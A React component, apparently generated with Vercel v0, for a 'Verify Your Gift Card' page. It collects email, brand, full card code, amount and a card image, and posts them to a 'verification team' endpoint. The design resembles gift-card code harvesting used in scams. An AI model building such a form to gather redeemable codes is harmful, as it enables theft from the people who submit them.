'use client'

import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Card } from '@/components/ui/card'
import { Upload, X, AlertCircle, CheckCircle2 } from 'lucide-react'

const giftCards = [
  'Amazon Gift Card',
  'Apple Store Gift Card',
  'Best Buy Gift Card',
  'Google Play Gift Card',
  'iTunes Gift Card',
  'Netflix Gift Card',
  'PlayStation Gift Card',
  'Sephora Gift Card',
  'Steam Wallet Gift Card',
  'Target Gift Card',
  'Uber Gift Card',
  'Walmart Gift Card',
  'Xbox Gift Card',
]

const countries = [
  'Australia',
  'Austria',
  'Belgium',
  'Canada',
  'China',
  'France',
  'Germany',
  'Japan',
  'Mexico',
  'Netherlands',
  'Spain',
  'United Kingdom',
  'United States',
]

const currencies = [
  { code: 'USD', symbol: '$' },
  { code: 'EUR', symbol: '€' },
  { code: 'GBP', symbol: '£' },
  { code: 'CAD', symbol: 'C$' },
  { code: 'AUD', symbol: 'A$' },
  { code: 'JPY', symbol: '¥' },
]

export default function CheckerForm() {
  const [formData, setFormData] = useState({
    email: '',
    country: '',
    giftCard: '',
    cardCode: '',
    amount: '',
    currency: 'USD',
  })
  const [uploadedFile, setUploadedFile] = useState<File | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [submitStatus, setSubmitStatus] = useState<{ type: 'success' | 'error' | null; message: string }>({
    type: null,
    message: '',
  })

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files?.[0]) {
      setUploadedFile(e.target.files[0])
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setSubmitStatus({ type: null, message: '' })

    try {
      const response = await fetch('/api/send-verification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...formData,
          fileName: uploadedFile?.name || null,
        }),
      })

      const data = await response.json()

      if (response.ok) {
        setSubmitStatus({
          type: 'success',
          message: data.message || 'Verification request submitted successfully!',
        })
        // Reset form
        setFormData({
          email: '',
          country: '',
          giftCard: '',
          cardCode: '',
          amount: '',
          currency: 'USD',
        })
        setUploadedFile(null)
      } else {
        setSubmitStatus({
          type: 'error',
          message: data.error || 'Failed to submit verification request',
        })
      }
    } catch (error) {
      console.error('[v0] Form submission error:', error)
      setSubmitStatus({
        type: 'error',
        message: 'An error occurred. Please try again.',
      })
    } finally {
      setIsLoading(false)
    }
  }

  const removeFile = () => {
    setUploadedFile(null)
  }

  return (
    <section className="py-16 sm:py-24 lg:py-32 bg-gradient-to-b from-white to-muted/20">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <Card className="p-8 sm:p-12 border border-border/50 shadow-lg">
          <h2 className="text-3xl sm:text-4xl font-bold text-foreground mb-3 text-center">
            Verify Your Gift Card
          </h2>
          <p className="text-center text-muted-foreground mb-10 max-w-2xl mx-auto">
            Submit your gift card details below and we'll verify the balance and validity for you
          </p>

          {submitStatus.type && (
            <div
              className={`mb-8 p-4 rounded-lg flex gap-3 items-start ${
                submitStatus.type === 'success'
                  ? 'bg-green-50 border border-green-200'
                  : 'bg-red-50 border border-red-200'
              }`}
            >
              {submitStatus.type === 'success' ? (
                <CheckCircle2 size={20} className="text-green-600 flex-shrink-0 mt-0.5" />
              ) : (
                <AlertCircle size={20} className="text-red-600 flex-shrink-0 mt-0.5" />
              )}
              <p
                className={`text-sm font-medium ${
                  submitStatus.type === 'success' ? 'text-green-800' : 'text-red-800'
                }`}
              >
                {submitStatus.message}
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Email */}
            <div>
              <label htmlFor="email" className="block text-sm font-semibold text-foreground mb-3">
                Email Address <span className="text-red-500">*</span>
              </label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                placeholder="john@example.com"
                className="w-full px-4 py-3 border border-input rounded-lg focus:ring-2 focus:ring-primary focus:border-primary outline-none transition bg-white text-foreground placeholder:text-muted-foreground"
                required
              />
            </div>

            {/* Grid for Country and Gift Card */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
              {/* Country Selection */}
              <div>
                <label htmlFor="country" className="block text-sm font-semibold text-foreground mb-3">
                  Country <span className="text-red-500">*</span>
                </label>
                <select
                  id="country"
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-input rounded-lg focus:ring-2 focus:ring-primary focus:border-primary outline-none transition bg-white text-foreground"
                  required
                >
                  <option value="">Select country</option>
                  {countries.map(country => (
                    <option key={country} value={country}>
                      {country}
                    </option>
                  ))}
                </select>
              </div>

              {/* Gift Card Selection */}
              <div>
                <label htmlFor="giftCard" className="block text-sm font-semibold text-foreground mb-3">
                  Gift Card Brand <span className="text-red-500">*</span>
                </label>
                <select
                  id="giftCard"
                  name="giftCard"
                  value={formData.giftCard}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-input rounded-lg focus:ring-2 focus:ring-primary focus:border-primary outline-none transition bg-white text-foreground"
                  required
                >
                  <option value="">Select gift card</option>
                  {giftCards.map(card => (
                    <option key={card} value={card}>
                      {card}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* Gift Card Code */}
            <div>
              <label htmlFor="cardCode" className="block text-sm font-semibold text-foreground mb-3">
                Gift Card Code <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                id="cardCode"
                name="cardCode"
                value={formData.cardCode}
                onChange={handleInputChange}
                placeholder="Enter the card code or number"
                className="w-full px-4 py-3 border border-input rounded-lg focus:ring-2 focus:ring-primary focus:border-primary outline-none transition bg-white text-foreground placeholder:text-muted-foreground font-mono"
                required
              />
            </div>

            {/* Amount and Currency */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
              <div>
                <label htmlFor="amount" className="block text-sm font-semibold text-foreground mb-3">
                  Amount <span className="text-red-500">*</span>
                </label>
                <input
                  type="number"
                  id="amount"
                  name="amount"
                  value={formData.amount}
                  onChange={handleInputChange}
                  placeholder="0.00"
                  className="w-full px-4 py-3 border border-input rounded-lg focus:ring-2 focus:ring-primary focus:border-primary outline-none transition bg-white text-foreground placeholder:text-muted-foreground"
                  step="0.01"
                  min="0"
                  required
                />
              </div>
              <div>
                <label htmlFor="currency" className="block text-sm font-semibold text-foreground mb-3">
                  Currency <span className="text-red-500">*</span>
                </label>
                <select
                  id="currency"
                  name="currency"
                  value={formData.currency}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-input rounded-lg focus:ring-2 focus:ring-primary focus:border-primary outline-none transition bg-white text-foreground"
                >
                  {currencies.map(curr => (
                    <option key={curr.code} value={curr.code}>
                      {curr.code} {curr.symbol}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* File Upload */}
            <div>
              <label htmlFor="file" className="block text-sm font-semibold text-foreground mb-3">
                Card Image (Optional)
              </label>
              <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary/50 transition cursor-pointer relative bg-muted/30">
                <input
                  type="file"
                  id="file"
                  onChange={handleFileChange}
                  className="absolute inset-0 opacity-0 cursor-pointer"
                  accept="image/*"
                />
                {uploadedFile ? (
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-primary/10 rounded flex items-center justify-center">
                        <Upload size={18} className="text-primary" />
                      </div>
                      <div className="text-left">
                        <p className="text-foreground font-medium text-sm">{uploadedFile.name}</p>
                        <p className="text-muted-foreground text-xs">
                          {(uploadedFile.size / 1024).toFixed(2)} KB
                        </p>
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={removeFile}
                      className="p-2 hover:bg-red-50 rounded transition"
                    >
                      <X size={18} className="text-red-500" />
                    </button>
                  </div>
                ) : (
                  <div className="flex flex-col items-center gap-2">
                    <Upload size={28} className="text-muted-foreground" />
                    <p className="text-foreground font-semibold">Click to upload or drag and drop</p>
                    <p className="text-sm text-muted-foreground">PNG, JPG, GIF up to 10MB</p>
                  </div>
                )}
              </div>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-primary hover:bg-primary/90 text-primary-foreground py-3 sm:py-4 text-base sm:text-lg font-semibold rounded-lg transition disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Submitting...' : 'Verify Gift Card'}
            </Button>

            <p className="text-center text-sm text-muted-foreground">
              Your information is secure and will be sent to our verification team
            </p>
          </form>
        </Card>
      </div>
    </section>
  )
}
